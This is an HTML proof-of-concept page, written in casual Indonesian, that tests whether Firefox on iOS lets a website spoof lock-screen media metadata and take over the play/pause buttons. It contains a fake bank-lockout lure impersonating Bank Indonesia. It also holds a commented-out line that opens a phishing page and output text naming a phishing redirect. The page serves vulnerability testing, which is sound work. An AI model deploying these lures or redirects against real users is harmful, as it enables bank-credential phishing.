<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Test</title>
</head>
<body style="font-family: sans-serif; padding: 20px; background: #ffffff;">
  <p>Buka di Firefox iOS. Pencet tombol di bawah.</p>
  <p>Kalau setelah pencet tombol, Lock Screen / Control Center lu nampilin lagu palsu, berarti BUG.</p>
  <button onclick="testMediaSession()" style="font-size: 20px; padding: 15px 30px;">Set Media Session Palsu</button>
  <br><br>
  <button onclick="testMediaSessionAction()" style="font-size: 20px; padding: 15px 30px;">Tes Tombol Play di Lock Screen</button>
  <br><br>
  <pre id="o" style="background: #f0f0f0; padding: 15px; white-space: pre-wrap;">Belum dites. Pencet tombol di atas.</pre>

  <script>
    function testMediaSession(){
      var o = document.getElementById('o');
      o.innerText = "Mencoba navigator.mediaSession.metadata...\n";
      o.innerText += "----------------------------------------\n";

      try{
        if(!navigator.mediaSession){
          o.innerText += "navigator.mediaSession TIDAK ADA (AMAN - Firefox nge-block Media Session API).";
          return;
        }

        o.innerText += "navigator.mediaSession ADA di Firefox iOS ini.\n\n";

        // Ini yang dites: Apakah Media Session bisa di-set tanpa ada media yang diputer?
        // Seharusnya, iOS harus nolak Media Session kalau gak ada media yang diputer.
        navigator.mediaSession.metadata = new MediaMetadata({
          title: '⚠️ AKUN BANK LU TERKUNCI! Klik di sini',
          artist: '【entity-Bank Indonesia¦canonical_name=Bank Indonesia】 - Verifikasi Sekarang',
          album: 'Pesan Penting dari Bank',
          artwork: [
            { src: 'https://0x403for.github.io/bank-logo.png', sizes: '512x512', type: 'image/png' }
          ]
        });

        o.innerText += "Media Session metadata BERHASIL di-set!\n";
        o.innerText += "Title: ⚠️ AKUN BANK LU TERKUNCI! Klik di sini\n";
        o.innerText += "Artist: 【entity-Bank Indonesia¦canonical_name=Bank Indonesia】 - Verifikasi Sekarang\n";
        o.innerText += "Album: Pesan Penting dari Bank\n\n";
        o.innerText += "Sekarang:\n";
        o.innerText += "1. Kunci HP lu (pencet tombol power).\n";
        o.innerText += "2. Liat Lock Screen lu. Apakah ada lagu / media yang judulnya 'AKUN BANK LU TERKUNCI!'?\n";
        o.innerText += "3. Atau buka Control Center (swipe dari pojok kanan atas). Liat apakah ada media player yang judulnya 'AKUN BANK LU TERKUNCI!'?\n\n";
        o.innerText += "Kalau ADA, berarti BUG! Website bisa palsuin media di Lock Screen / Control Center tanpa ada media yang diputer.\n";
        o.innerText += "Kalau GAK ADA, berarti AMAN - iOS nolak Media Session karena gak ada media yang diputer.\n";
        o.innerText += "\nCatatan: Untuk artwork-nya, lu harus upload gambar bank-logo.png dulu ke 0x403for.github.io, atau ganti URL-nya ke gambar yang udah ada (misal https://0x403for.github.io/google.jpg).";

      }catch(e){
        o.innerText += "Error (AMAN): " + e;
      }
    }

    function testMediaSessionAction(){
      var o = document.getElementById('o');
      o.innerText = "Mencoba set Media Session Action Handler (Play/Pause)...\n";
      try{
        if(!navigator.mediaSession){
          o.innerText += "navigator.mediaSession TIDAK ADA.";
          return;
        }

        // Ini yang dites: Apakah website bisa hijack tombol Play/Pause di Lock Screen?
        // Misal korban pencet Play di Lock Screen, website-nya malah buka tab phishing.
        navigator.mediaSession.setActionHandler('play', function(){
          o.innerText += "BUG! Tombol PLAY di Lock Screen / Control Center berhasil di-hijack!\n";
          o.innerText += "Korban pencet Play di Lock Screen, tapi yang ke-trigger malah fungsi ini di website.\n";
          o.innerText += "Attacker bisa ganti fungsi ini jadi: window.open('https://phishing-bank.com') / window.location = 'https://phishing-bank.com'\n";
          // JANGAN uncomment ini pas ngetes, ini cuma contoh:
          // window.open('https://0x403for.github.io/phishing.html');
        });

        navigator.mediaSession.setActionHandler('pause', function(){
          o.innerText += "BUG! Tombol PAUSE di Lock Screen berhasil di-hijack juga!\n";
        });

        navigator.mediaSession.metadata = new MediaMetadata({
          title: 'Tes Tombol Play - Pencet Play di Lock Screen',
          artist: 'Test - Sarwo Edi Wibowo',
          album: 'Media Session Test'
        });

        o.innerText += "Action Handler Play/Pause BERHASIL di-set!\n\n";
        o.innerText += "Sekarang:\n";
        o.innerText += "1. Kunci HP lu, liat Lock Screen, pencet tombol Play di media player-nya.\n";
        o.innerText += "2. Buka lagi Firefox, liat apakah teks di sini berubah jadi 'Tombol PLAY berhasil di-hijack!'?\n";
        o.innerText += "3. Kalau berubah, berarti website bisa hijack tombol Play di Lock Screen.\n";
        o.innerText += "4. Kalau gak berubah, berarti AMAN - iOS gak ngasih action handler-nya ke website karena gak ada media yang diputer.\n";

      }catch(e){
        o.innerText += "Error (AMAN): " + e;
      }
    }
  </script>
</body>
</html>
